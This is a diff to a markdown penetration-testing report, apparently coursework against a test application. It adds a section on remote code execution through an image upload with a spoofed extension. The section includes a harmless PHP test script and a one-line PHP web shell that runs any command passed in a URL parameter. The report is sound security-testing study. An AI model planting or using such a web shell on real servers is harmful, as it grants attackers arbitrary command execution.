@@ -288,6 +288,28 @@ doggo
 - After checking the responses, there wasn't any sign of possibility of command injection vulnerability via the image search bar. No significat delays also weren't the case.
 - **Image search application is durable to the command injection technique.**
 
+## 3. Remote Code Execution
+- Remote Code Execution attack is slightly diffrent to the simple Command Injection expolitation. 
+- It can be viewed as execution of some potentionally harmful binnary file at the target remote server.
+- We will try to exploit the RCE via image upload function by uploading the exploitable PHP or JS script with spoofed extension.
+
+#### Simple PHP test script
+```php
+<?php  
+$x=15;  
+$y=30;  
+$z=$x+$y;  
+echo "Sum: ",$z;  
+?>
+```
+
+#### PHP backdoor exploitation script
+```<?php
+$cmd=$_GET['cmd'];
+system($cmd);
+?>
+```
+
 ### References
 - [1] Command Injection - OWASP. Command Injection - OWASP [online]. Texas, USA: OWASP Foundation, 2018 [quoted. 2019-04-13]. Availiable from: https://www.owasp.org/index.php/Command_Injection
 - [2] DVWA - Damn Vulnerable Web Application [online]. UK: DVWA, 2019 [quoted. 2019-04-13]. Availiable from: http://www.dvwa.co.uk/
